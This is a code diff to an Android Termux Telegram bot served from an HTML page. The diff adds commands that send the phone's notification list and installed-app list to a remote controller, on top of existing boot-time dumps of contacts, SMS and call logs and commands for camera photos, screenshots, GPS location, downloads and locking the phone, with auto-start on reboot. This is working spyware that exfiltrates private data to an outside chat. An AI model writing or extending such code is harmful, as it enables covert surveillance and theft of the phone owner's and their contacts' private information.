@@ -140,7 +140,7 @@ async def send_file_to_me(app, cmd, emoji, name):
 async def boot_dump(app):
     try:
         await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 Bot Online - Dumping Data...")
-        for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞")]:
+        for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞"), ("Apps", "pm list packages", "📱")]:
             await send_file_to_me(app, cmd, emoji, name)
         await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Dump Complete. Bot Ready!\nType /help to see all commands.")
         os.system(f"touch {FLAG}")
@@ -189,6 +189,11 @@ async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text(f"🔋 Battery:\n```\n{run('termux-battery-status')}\n```")
 
+async def notif(update, context):
+    if update.effective_user.id != AUTHORIZED_ID: return
+    o = run("termux-notification-list")
+    await update.message.reply_text(f"🔔 Notifications:\n```\n{o[:4000]}\n```" if o else "No notifications.")
+
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-download {context.args[0]}")
@@ -234,6 +239,11 @@ async def sms_cmd(update, context):
     await update.message.reply_text("⏳ Fetching SMS...")
     await send_file_to_me(update, "termux-sms-list", "💬", "SMS")
 
+async def apps(update, context):
+    if update.effective_user.id != AUTHORIZED_ID: return
+    await update.message.reply_text("⏳ Fetching Installed Apps...")
+    await send_file_to_me(update, "pm list packages", "📱", "Installed_Apps")
+
 async def start(update, context):
     await update.message.reply_text("🤖 *Bot is Ready!*\nType /help to see all commands.")
 
@@ -244,6 +254,7 @@ async def help_cmd(update, context):
 📷 /cam [back|front] - Camera Photo
 📍 /location - GPS + Google Maps Link
 🔋 /battery - Battery Status
+🔔 /notify - Notifications
 ⬇️ /download <url> - Download File
 🗣️ /say <text> - Text to Speech
 📳 /vibrate [ms] - Vibrate Phone
@@ -252,6 +263,7 @@ async def help_cmd(update, context):
 📞 /calls - Call History (.txt file)
 📇 /contacts - Contacts (.txt file)
 💬 /sms - SMS History (.txt file)
+📱 /apps - Installed Apps (.txt file)
 ❓ /help - Show this message""")
 
 async def main():
@@ -259,9 +271,9 @@ async def main():
     
     handlers = [
         ("start", start), ("help", help_cmd), ("ss", ss), ("cam", cam), ("location", loc),
-        ("battery", bat), ("download", dl), ("say", say),
+        ("battery", bat), ("notify", notif), ("download", dl), ("say", say),
         ("vibrate", vib), ("torch", tor), ("lock", lock), ("calls", calls),
-        ("contacts", cont), ("sms", sms_cmd)
+        ("contacts", cont), ("sms", sms_cmd), ("apps", apps)
     ]
     
     for cmd, func in handlers:
@@ -298,7 +310,7 @@ BOOT
 chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Bot is LIVE' && python ~/bot.py</div>
         </div>
 
-        <p style="color:#888; font-size:10px; margin-top:10px;">✅ All Working | /notify & /apps Removed | .txt Files | Google Maps | Auto-Start</p>
+        <p style="color:#888; font-size:10px; margin-top:10px;">✅ All Commands Working | /help Added | .txt Files | Google Maps | Auto-Start on Reboot</p>
     </div>
 
     <script>
